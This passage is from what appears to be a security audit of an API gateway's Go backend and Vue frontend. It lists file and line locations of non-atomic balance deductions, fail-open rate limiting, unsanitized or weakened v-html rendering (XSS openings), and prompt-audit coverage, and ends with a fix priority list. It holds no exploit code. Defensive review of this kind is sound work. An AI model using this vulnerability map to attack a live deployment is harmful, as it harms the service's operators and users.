| `AdjustBalance` / `SetBalance` | `repository/user_repo.go:962/986` | `WHERE balance+$1 >=0 RETURNING` | correct — used by admin `UpdateUserBalance` with three operations |
| `ReserveBatchImageBalance` | `repository/usage_billing_repo.go:275` | `WHERE balance >= $1` + `frozen_balance` hold | correct atomic hold pattern — should be generalized |
| `postUsageBilling` | `service/gateway_usage_billing.go:135` | calls `DeductBalance` (overdraft) | fallback when `usageBillingRepo == nil` |
| `QueueDeductBalance` | `service/billing_cache_service.go:379` | Redis `deductBalanceScript` `GET+SET` in Lua | not atomic w.r.t. DB; queue is bounded and may drop |

Verdict: only `AdjustBalance`/`SetBalance` and `ReserveBatchImageBalance` are truly guarded; gateway hot path is not.

### Rate-limit key sites (grep `RateLimiter|AbuseClientPrefix|GetSecurityClientIP|SecurityClientIP|Limit(`)

* `middleware/rate_limiter.go:200 AbuseClientPrefix` inside `Limit`, `LimitSlidingWithOptions`, `LimitSuccessfulWithOptions`
* `server/middleware/panel_rate_limit.go:119 SecurityClientIP` in `PublicIP()`, `userScoped` uses `AuthSubject.UserID` (correct — not IP-based)
* `server/middleware/api_key_auth.go:135 GetSecurityClientIP` for IP ACL (subject to trust switch)
* `pkg/ip/ip.go:48 AbuseClientPrefix` definition; `GetClientIP` legacy header precedence documented

All gateway `Limit` call sites use `RateLimitOptions{}` → fail-open.

### `v-html` / `innerHTML` sites (`frontend/src`, grep `v-html|innerHTML`)

| Site | Sanitized? |
|---|---|
| `HomeView.vue:12 v-html="homeContent"` | **No** |
| `CustomPageView.vue:74 v-html="renderedHtml"` | `DOMPurify` but with `ADD_TAGS:['iframe']` → **weakened** |
| `ModelPlazaContent.vue:13 v-html="descriptionHtml"` | `DOMPurify.sanitize(marked.parse(...))` — OK |
| `AnnouncementBell.vue:210 v-html="renderMarkdown(...)"` | `DOMPurify.sanitize(marked.parse(...))` — OK |
| `AnnouncementPopup.vue:58 v-html="renderedContent"` | same — OK |
| `AdminComplianceDialog.vue:25 v-html="renderedDocument"` | same — OK |
| `AppSidebar.vue:97,122,142 v-html="sanitizeSvg(...)"` | `DOMPurify` svg profile — see S3-08 |
| `ImageUpload.vue:14 v-html="sanitizedValue"` | `sanitizeSvg` — see S3-08 |
| `LegalDocumentView.vue:79 v-html="renderedHtml"` | `DOMPurify.sanitize(marked.parse(...))` — OK |
| `UseKeyModal.vue:170 v-html="file.highlighted"` | `file.highlighted` from server-side highlighting — not sanitized; but privileged |

`sanitizeUrl` coverage: `AppHeader`, `AppSidebar`, `HomeView`, `KeyUsageView`, `CustomerServiceModal`, `AccountsView` correctly use `sanitizeUrl` on `docUrl`/`siteLogo`/`base_url`; `CustomPageView` iframe does *not*.

### Prompt audit route coverage (audit: `prompt_audit_route_coverage_test.go:23-96`)

All gateway handlers listed in `security_audit_order_test.go` call `checkSecurityAudit` before `SelectAccount`/`.Forward`. One gap: `openai_gateway_handler.go:2317` WebSocket `first_turn` and `2709` `subsequent_turn` use `checkSecurityAuditStage` with distinct `stage` values; the handler correctly **does not** cache completion across stages (`cachesSecurityAuditCompletion("subsequent_turn")==false`, `security_audit_helper.go:48`). Non-gateway routes (`/v1/sub2api/billing`, `/v1/models`) intentionally skip audit (no user prompt) — correct. The only auditor-gated risk is S3-13 fallback mutation after check.

### Build verification

```
$ go vet ./backend/internal/handler ./backend/internal/service
(no output — passes; no code changes made per task rules)
```

---

## Recommended prioritization

1. **Immediate (before next deploy):** S3-01 hold-model fix + S3-03 strict enforcement mode + S3-04 sanitize `homeContent` (one-line DOMPurify wrapper) + S3-02 flip trust switch default to `false`.
2. **Next sprint:** S3-06 token-in-URL removal + S3-05 cookie migration plan + S3-07 failover budget cap.
3. **Hardening:** S3-08 SVG hardening + S3-14 global image semaphore + S3-10 `TextMaxBodySize` fix + S3-15 cache-key cleanup.

